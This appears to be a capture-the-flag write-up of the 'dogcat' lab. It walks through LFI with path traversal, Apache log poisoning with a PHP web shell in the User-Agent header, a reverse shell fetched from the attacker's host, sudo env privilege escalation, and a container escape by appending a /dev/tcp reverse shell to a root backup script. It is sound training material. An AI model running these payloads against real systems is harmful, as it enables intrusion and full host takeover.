# dogcat

Starting off with some recon:
```sh
kali@kali nmap -sC -sV 10.10.219.26

Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 09:50 CEST
Nmap scan report for 10.10.219.26
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds
```

Taking a look at the website:
![grafik](https://github.com/Aryt3/writeups/assets/110562298/ff507e1b-0774-493c-afde-22b90ff5068b)

Solarized dark             |  Solarized Ocean
:-------------------------:|:-------------------------:
![grafik](https://github.com/Aryt3/writeups/assets/110562298/2c0abc24-cfa2-4f35-8713-fa79277eae50)  |  ![grafik](https://github.com/Aryt3/writeups/assets/110562298/d269deaf-e0e7-4165-a1da-4cc7ae7cf2bc)

There seems to be nothing of interest except the URL `http://10.10.219.26/?view=dog`. <br/>
LFI doesn't seem to work, we can't access `/etc/passwd` nor `/etc/shadow`. <br/>
But knowing PHP a bit I know some other things to try out. <br/>

First of all we should keep in mind that the url of the images is the following `/dogs/6.jpg`. <br/>
This is important if we want to escape from there. Trying something out like `http://10.10.219.26/?view=dog/../index` doesn't seem to get us far, as we only get the following reply: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/847762ee-53d7-4e73-b32f-98ecde99252e)

In some cases we can go around this by using a base64 filter function in php. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/9ae57f92-813a-4d3c-b32b-2b845b9255a6)

Seems like this worked as we got the following string back: <br/>
```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

Decoding this we get the following php file: <br/>
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

Inspecting the code we find the following check: <br/>
```php
if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
```

So this seems to check if I either enter dog or cat. Meaning I must include at least 1 of those 2. <br/>
After the check comes out as true the following function is being executed. <br/>
```php
include $_GET['view'] . $ext;
```

This basically gets the file to view with the extension being set via the variable `$ext`. <br/>
Now knowing all the parameters we can simply implement all of those into our path traversal exploit. <br/>
```
http://10.10.219.26/?view=?dog/../../../../etc/passwd&ext=
```

Using this URL we get the actual output we want. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/ac0376cc-0380-46e6-8407-50c07e2182bb)
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
```

After poking around a bit I also found the file `/var/log/apache2/access.log`. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/44f84c81-be23-492c-9630-e99f08b17379)

Looking at the access logs we can see that the user agent is logged additionally without being URL encoded. <br/>
Now this may be used to upload malicious content. <br/>

Testing with the following request: <br/>
```sh
GET / HTTP/1.1
Host: 10.10.198.107
Upgrade-Insecure-Requests: 1
User-Agent: <?php echo phpinfo()?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Viewing the logs: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/1339543d-0012-46db-8316-d8cf527820d0)

After knowing that it works I sent another request to implement a way to execute commands. <br/>
```sh
GET / HTTP/1.1
Host: 10.10.27.254
Upgrade-Insecure-Requests: 1
User-Agent: <?php echo shell_exec($_GET['cmd']) ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

After executing the request I used the following url to list the contents of the working directory: <br/>
```sh
http://10.10.27.254/?view=dog/../../../../var/log/apache2/access.log&cmd=ls&ext=
```

This let's us see the following: <br/>
```
10.18.20.25 - - [27/Oct/2023:10:41:30 +0000] "GET / HTTP/1.1" 200 500 "-" "cat.php cats dog.php dogs flag.php index.php style.css
```

This doesn't get us far so sending the following request I tried to send over a php reverse shell. <br/>
```sh
[GET / HTTP/1.1
Host: 10.10.27.254
Upgrade-Insecure-Requests: 1
User-Agent: <?php echo file_get_contents('http://10.18.20.25/shell.php'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Looking at my http server: <br/>
```sh
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.27.254 - - [27/Oct/2023 12:51:21] "GET / HTTP/1.0" 200 -
10.10.27.254 - - [27/Oct/2023 12:51:21] "GET /shell.php HTTP/1.0" 200 -
```

After this going to `http://10.10.212.103/shell.php` will activate our shell. <br/>
```sh
nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.18.20.25] from (UNKNOWN) [10.10.212.103] 45696
Linux 10660a7a2463 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 12:09:51 up 10 min,  0 users,  load average: 0.01, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ whoami
www-data
```

Getting the first flag: <br/>
```sh
$ ls /var/www/html/
cat.php
cats
dog.php
dogs
flag.php
index.php
shell.php
style.css  
$ cat /var/www/html/flag.php
<?php
$flag_1 = "THM{REDACTED}"
?>
```

Priviledge escalation: <br/>
```sh
$ sudo -l
Matching Defaults entries for www-data on 10660a7a2463:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on 10660a7a2463:
    (root) NOPASSWD: /usr/bin/env  
```

Finding binary exploit on GTFOBins. (https://gtfobins.github.io/gtfobins/env/) <br/>
```sh
$ sudo env /bin/sh
$ whoami
root
$ ls /root/
flag3.txt
$ cat /root/*
THM{REDACTED}
```

Seems like we skipped a flag. Anyway let's find the second flag. <br/>
```sh
$ ls -la /home/
total 8
drwxr-xr-x 2 root root 4096 Feb  1  2020 .
drwxr-xr-x 1 root root 4096 Oct 27 12:00 ..
$ ls /var/www/
flag2_QMW7JvaY2LvK.txt
html
cat /var/www/*
THM{REDACTED}
```

After some searching I found an interesting directory. <br/>
```sh
$ ls -la /opt/
total 12
drwxr-xr-x 1 root root 4096 Oct 27 12:00 .
drwxr-xr-x 1 root root 4096 Oct 27 12:00 ..
drwxr-xr-x 2 root root 4096 Apr  8  2020 backups
$ ls -la /opt/backups/
total 2892
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
drwxr-xr-x 1 root root    4096 Oct 27 12:00 ..
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Oct 27 12:22 backup.tar
$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

If this bash file is being executed automatically every few minutes or so we may include a reverse shell to gain access to outside the container. <br/>
```sh
$ echo "bash -i >& /dev/tcp/10.18.20.25/4444 0>&1" >> backup.sh
$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/10.18.20.25/4444 0>&1
```

After a few seconds I successfully got another reverse shell. <br/>
```sh
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.18.20.25] from (UNKNOWN) [10.10.212.103] 38708
bash: cannot set terminal process group (2991): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
root
```

Getting the last flag: <br/>
```sh
root@dogcat:~# ls -la /root/
total 40
drwx------  6 root root 4096 Apr  8  2020 .
drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr  8  2020 .cache
drwxr-xr-x  5 root root 4096 Mar 10  2020 container
-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
drwx------  3 root root 4096 Apr  8  2020 .gnupg
drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
root@dogcat:~# cat /root/flag4.txt
THM{REDACTED}
```









